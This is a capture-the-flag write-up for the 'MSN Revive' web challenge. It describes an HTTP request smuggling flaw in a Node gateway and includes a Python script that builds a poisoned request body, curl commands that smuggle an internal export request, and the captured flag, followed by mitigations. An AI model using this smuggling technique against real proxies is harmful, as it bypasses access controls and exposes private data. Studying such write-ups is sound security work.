# MSN Revive - Web Writeup

## Challenge
- Name: `MSN Revive`
- Category: `Web`
- Main target: `http://msnrevive.challs.srdnlen.it`

## Summary
The bug is an HTTP desync/request smuggling issue in the Node gateway.  
`/api/export/chat` is intended to be localhost-only at gateway level, but a crafted request to `/api/chat/event` lets us smuggle an internal `POST /api/export/chat` request to the Flask backend.

The exported seeded chat contains the flag.

Flag:
`srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}`

## Recon
From source analysis:

- Gateway has a local-only protection:

```js
app.all("/api/export/chat", (req, res, next) => {
  if (!isLocalhost(req)) {
    return res.status(403).json({ ok: false, error: "WIP: local access only" });
  }
  next();
});
```

- Backend `/api/export/chat` itself does not require auth and returns exported data for a provided session id.
- Seeded session id in backend init data:
  - `00000000-0000-0000-0000-000000000000`

## Vulnerability
In `gateway.js`, route `/api/chat/event` rewrites `Content-Length` for content-type `application/x-msnmsgrp2p`:

1. It reads `totalSize` from the first 48 bytes (binary MSN P2P header).
2. It forwards `Content-Length = totalSize + 48`.

This value is attacker-controlled via request body content.

So we can force backend-visible `Content-Length` to a smaller value than the real bytes sent, causing a request boundary mismatch on keep-alive backend connections:

- Backend consumes only the declared short body.
- Remaining bytes are interpreted as a new HTTP request (smuggled request).

## Exploit Strategy
1. Send `POST /api/chat/event` with:
   - `Content-Type: application/x-msnmsgrp2p`
   - Body starts with a 48-byte fake P2P header with `totalSize = 0` (so forwarded CL = 48).
2. Append a full second HTTP request in the same body:

```http
POST /api/export/chat HTTP/1.1
Host: msnrevive.challs.srdnlen.it
Content-Type: application/json
Content-Length: 67
Connection: keep-alive

{"session_id":"00000000-0000-0000-0000-000000000000","format":"html"}
```

3. Send a follow-up request (e.g. `GET /api/me`) and read the desynced response queue.
4. Response body contains exported chat with flag.

## Repro (minimal)
Generate `poison.bin`:

```python
import json, struct

session_id = "00000000-0000-0000-0000-000000000000"
export_json = json.dumps({"session_id": session_id, "format": "html"}, separators=(",", ":"))

smuggled = (
    "POST /api/export/chat HTTP/1.1\r\n"
    "Host: msnrevive.challs.srdnlen.it\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(export_json)}\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    f"{export_json}"
).encode()

# <IIQQIIIIQ, totalSize is 4th field => set to 0
header = struct.pack("<IIQQIIIIQ", 1, 1, 0, 0, 0, 0, 0, 0, 0)
open("poison.bin", "wb").write(header + smuggled)
```

Exploit with curl:

```bash
curl -sS -o /tmp/r1.txt -w 'r1:%{http_code} len:%{size_download}\n' \
  -X POST 'http://msnrevive.challs.srdnlen.it/api/chat/event' \
  -H 'Content-Type: application/x-msnmsgrp2p' \
  --data-binary '@poison.bin'

curl -sS 'http://msnrevive.challs.srdnlen.it/api/me' | grep -o 'srdnlen{[^"]*}'
```

## Why Gateway Protection Fails
The localhost check is only applied to direct client route handling in gateway.  
The smuggled request is injected into the backend connection after proxy framing confusion, bypassing that route-level policy.

## Mitigations
1. Never derive transport framing (`Content-Length`) from untrusted payload data.
2. Enforce strict proxy parsing invariants and reject ambiguous framing.
3. Disable connection reuse for endpoints with custom body handling, or isolate upstream pools.
4. Add backend-side authz on `/api/export/chat`.
5. Add integration tests for desync/smuggling on gateway paths.

